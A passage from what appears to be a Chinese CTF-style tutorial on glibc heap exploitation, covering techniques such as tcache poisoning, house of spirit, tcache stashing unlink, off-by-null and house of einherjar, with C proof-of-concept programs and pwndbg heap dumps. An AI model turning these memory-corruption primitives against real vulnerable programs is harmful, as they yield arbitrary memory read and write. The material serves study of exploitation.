class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造堆需要绕过：<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code></p><p>伪造完成后改地址相邻的下一个堆的的<code>prve_size</code>为伪造的堆大小、<code>inuse</code>位为<code>0</code>再释放掉它即可向后合并取消连接<code>fake chunk</code></p><p>先创建两个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405680Size: 0x431Top chunk | PREV_INUSEAddr: 0x405ab0Size: 0x20551<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在第一个堆伪造一个堆的<code>fd、bk</code>并把第二个堆<code>inuse</code>位和<code>prve_size</code>位改掉</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x431Allocated chunkAddr: 0x405680Size: 0x430Top chunk | PREV_INUSEAddr: 0x405ab0Size: 0x20551pwndbg&gt; x&#x2F;20gx 0x4052500x405250:0x00000000000000000x00000000000004310x405260:0x00000000000000000x00000000000000000x405270:0x00000000004040500x00000000004040580x405280:0x00000000000000000x00000000000000000x405290:0x00000000000000000x00000000000000000x4052a0:0x00000000000000000x00000000000000000x4052b0:0x00000000000000000x00000000000000000x4052c0:0x00000000000000000x00000000000000000x4052d0:0x00000000000000000x00000000000000000x4052e0:0x00000000000000000x0000000000000000pwndbg&gt; x&#x2F;20gx 0x4056800x405680:0x00000000000004200x00000000000004300x405690:0x00000000000000000x00000000000000000x4056a0:0x00000000000000000x00000000000000000x4056b0:0x00000000000000000x00000000000000000x4056c0:0x00000000000000000x00000000000000000x4056d0:0x00000000000000000x00000000000000000x4056e0:0x00000000000000000x00000000000000000x4056f0:0x00000000000000000x00000000000000000x405700:0x00000000000000000x00000000000000000x405710:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放第二个堆即可通过第一个堆去改任意地址的内容</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x431Allocated chunkAddr: 0x405680Size: 0x430Allocated chunk | PREV_INUSEAddr: 0x405ab0Size: 0x20551pwndbg&gt; x&#x2F;20gx 0x4052500x405250:0x00000000000000000x00000000000004310x405260:0x00000000000000000x0000000000020da10x405270:0x00000000004040500x00000000004040580x405280:0x00000000000000000x00000000000000000x405290:0x00000000000000000x00000000000000000x4052a0:0x00000000000000000x00000000000000000x4052b0:0x00000000000000000x00000000000000000x4052c0:0x00000000000000000x00000000000000000x4052d0:0x00000000000000000x00000000000000000x4052e0:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdin, NULL);setbuf(stdout, NULL);size_t stack_var;intptr_t *a &#x3D; malloc(128);intptr_t *b &#x3D; malloc(128);    free(a);free(b);b[0] &#x3D; (intptr_t)&amp;stack_var;intptr_t *c &#x3D; malloc(128);assert((long)&amp;stack_var &#x3D;&#x3D; (long)c);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打<code>fd</code>实现任意地址读写</p><p>创建两个堆再释放掉，进入<code>tcache</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x405250Size: 0x91fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x4052e0Size: 0x91fd: 0x405260Top chunk | PREV_INUSEAddr: 0x405370Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改第二个堆的<code>fd</code>为目标地址之后再申请即可实现任意地址读写</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x91Free chunk (tcache) | PREV_INUSEAddr: 0x4052e0Size: 0x91fd: 0x7fffffffdd70Top chunk | PREV_INUSEAddr: 0x405370Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdout, NULL);malloc(1);unsigned long long *a; unsigned long long fake_chunks[10];     fake_chunks[1] &#x3D; 0x40; a &#x3D; &amp;fake_chunks[2];free(a);void *b &#x3D; malloc(0x30);assert((long)b &#x3D;&#x3D; (long)&amp;fake_chunks[2]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在栈上伪造一个堆之后释放掉再申请即可申请到伪造的堆，<code>tcache</code>会判断取出堆之后的下标不能为负数，所以要先创建一个堆</p><p>先随便创建一个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x21Top chunk | PREV_INUSEAddr: 0x405270Size: 0x20d91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再在栈上伪造一个堆，主要是伪造<code>size</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd200x7fffffffdd20:0x000000000000000f0x00000000000000400x7fffffffdd30:0x00007fffffffdd980x00000000000000f00x7fffffffdd40:0x00000000000000c20x00000000004013ad0x7fffffffdd50:0x00007ffff7de59a00x00000000000000000x7fffffffdd60:0x00000000004013600x00000000004010f00x7fffffffdd70:0x00007fffffffde600x00007fffffffdd300x7fffffffdd80:0x00000000004013600x00007ffff7a05b970x7fffffffdd90:0x00000000000000010x00007fffffffde680x7fffffffdda0:0x000000010000c0000x00000000004011d60x7fffffffddb0:0x00000000000000000x762a1758ffbc0fb4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放之后再申请即可申请到这个位置实现任意地址读写</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x40 [  1]: 0x7fffffffdd30 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;    unsigned long stack_var[0x10] &#x3D; &#123;0&#125;;    unsigned long *chunk_lis[0x10] &#x3D; &#123;0&#125;;    unsigned long *target;    setbuf(stdout, NULL);    stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);    for(int i &#x3D; 0;i &lt; 9;i++)&#123;        chunk_lis[i] &#x3D; (unsigned long*)malloc(0x90);    &#125;    for(int i &#x3D; 3;i &lt; 9;i++)&#123;        free(chunk_lis[i]);    &#125;    free(chunk_lis[1]);    free(chunk_lis[0]);    free(chunk_lis[2]);        malloc(0xa0);    malloc(0x90);    malloc(0x90);    chunk_lis[2][1] &#x3D; (unsigned long)stack_var;    calloc(1,0x90);    target &#x3D; malloc(0x90);       assert(target &#x3D;&#x3D; &amp;stack_var[2]);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该方法是<code>2.27</code>或<code>2.29</code>下用<code>calloc</code>创建堆时候针对<code>small bin</code>的攻击</p><p>创建<code>9</code>个大小属于<code>unsorted bin</code>的堆并全部释放</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405390smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个比释放的堆大的堆使得释放的堆进入<code>small bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着从<code>tcache</code>取了两个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>small bin</code>的最后一个堆<code>fd</code>改成栈上的地址，即目标地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0 [corrupted]FD: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390BK: 0x405250 —▸ 0x405390 —▸ 0x7fffffffdcd0 —▸ 0x7fffffffdce0 ◂— 0x0largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于<code>calloc</code>不会从<code>tcache</code>中取堆，所以用<code>calloc</code>创建一个堆，<code>tcache</code>中有两个空位，此时<code>small bin</code>中的堆会进入<code>tcache</code>，再次用<code>malloc</code>申请即可得到篡改的栈地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0xa0 [  7]: 0x7fffffffdce0 —▸ 0x4053a0 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0xa0 [corrupted]FD: 0x405390 —▸ 0x4056c0 ◂— 0x0BK: 0x7fffffffdce0 ◂— 0x0largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fastbin-dup-consolidate-double-free"><a href="#fastbin-dup-consolidate-double-free" class="headerlink" title="fastbin_dup_consolidate(double free)"></a>fastbin_dup_consolidate(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;void main() &#123;void *ptr[7];for(int i &#x3D; 0; i &lt; 7; i++)ptr[i] &#x3D; malloc(0x40);for(int i &#x3D; 0; i &lt; 7; i++)free(ptr[i]);void* p1 &#x3D; calloc(1,0x40);  free(p1);  void* p3 &#x3D; malloc(0x400);assert(p1 &#x3D;&#x3D; p3);free(p1);void *p4 &#x3D; malloc(0x400);assert(p4 &#x3D;&#x3D; p3);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用了<code>double free</code>和<code>calloc</code>不会从<code>tcache</code>取堆的原理</p><p>填满<code>tcache</code>再释放一个堆到<code>fast bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x405890 ◂— 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个属于<code>small bin</code>的堆然后再次释放<code>fast bin</code>里的堆，此时<code>fast bin</code>中的堆被和那个大于<code>small bin</code>的堆合并了</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x00x410 [  1]: 0x4058a0 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请出合并的堆即可申请到那个大的堆了且它并没有被释放</p><h3 id="overlapping-chunks-off-by-one"><a href="#overlapping-chunks-off-by-one" class="headerlink" title="overlapping_chunks(off-by-one)"></a>overlapping_chunks(off-by-one)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main(int argc , char* argv[])&#123;setbuf(stdout, NULL);intptr_t *p1,*p2,*p3,*p4;    p1 &#x3D; malloc(0x500 - 8);p2 &#x3D; malloc(0x500 - 8);p3 &#x3D; malloc(0x80 - 8);memset(p1, &#39;1&#39;, 0x500 - 8);memset(p2, &#39;2&#39;, 0x500 - 8);memset(p3, &#39;3&#39;, 0x80 - 8);free(p2);int evil_chunk_size &#x3D; 0x581;int evil_region_size &#x3D; 0x580 - 8;    *(p2-1) &#x3D; evil_chunk_size;     p4 &#x3D; malloc(evil_region_size);memset(p4, &#39;4&#39;, evil_region_size);memset(p3, &#39;3&#39;, 80);assert(strstr((char *)p4, (char *)p3));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请三个堆（前两个堆大于<code>tcache</code>)，利用第一个堆去修改第二个堆的内容，释放第二个堆进入<code>unsorted bin</code>之后改第二个堆的<code>size</code>为第二个堆和第三个堆的大小之和，再去创建这个大小的堆即可利用这个堆去覆写第三个堆而第三个堆仍然存在</p><p>先创建三个堆，并释放第二个堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x501Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405750Size: 0x501fd: 0x7ffff7dcfca0bk: 0x7ffff7dcfca0Allocated chunkAddr: 0x405c50Size: 0x80Top chunk | PREV_INUSEAddr: 0x405cd0Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改第二个堆的<code>size</code>位使其覆盖下一个堆，此时已经看到第二个堆包含了第三个堆，再去创建出这个堆即可实现对第三个对的<code>overlap</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x501Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405750Size: 0x581fd: 0x7ffff7dcfca0bk: 0x7ffff7dcfca0Top chunk | PREV_INUSEAddr: 0x405cd0Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="poison-null-byte-off-by-null"><a href="#poison-null-byte-off-by-null" class="headerlink" title="poison_null_byte(off-by-null)"></a>poison_null_byte(off-by-null)</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x9f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xa00</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code>,只要堆大小在<code>tcache</code>之上即可</p><h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;assert.h&gt;int main()&#123;int* ptr1 &#x3D; malloc(0x10); long long* top_ptr &#x3D; malloc(0x100000);long long* mmap_chunk_2 &#x3D; malloc(0x100000);long long* mmap_chunk_3 &#x3D; malloc(0x100000);    mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;    free(mmap_chunk_3); long long* overlapping_chunk &#x3D; malloc(0x300000);    int distance &#x3D; mmap_chunk_2 - overlapping_chunk;overlapping_chunk[distance] &#x3D; 0x1122334455667788;assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code></p><h3 id="house-of-einherjar-off-by-null-1"><a href="#house-of-einherjar-off-by-null-1" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;int main()&#123;setbuf(stdin, NULL);setbuf(stdout, NULL);uint8_t* a;uint8_t* b;uint8_t* d;a &#x3D; (uint8_t*) malloc(0x38);int real_a_size &#x3D; malloc_usable_size(a);size_t fake_chunk[6];fake_chunk[0] &#x3D; 0x100;fake_chunk[1] &#x3D; 0x100;fake_chunk[2] &#x3D; (size_t) fake_chunk; fake_chunk[3] &#x3D; (size_t) fake_chunk; fake_chunk[4] &#x3D; (size_t) fake_chunk; fake_chunk[5] &#x3D; (size_t) fake_chunk; b &#x3D; (uint8_t*) malloc(0x4f8);int real_b_size &#x3D; malloc_usable_size(b);uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);    a[real_a_size] &#x3D; 0; size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;fake_chunk[1] &#x3D; fake_size;free(b);d &#x3D; malloc(0x200);assert((long)d &#x3D;&#x3D; (long)&amp;fake_chunk[2]);&#125;<span aria-hidden="true" 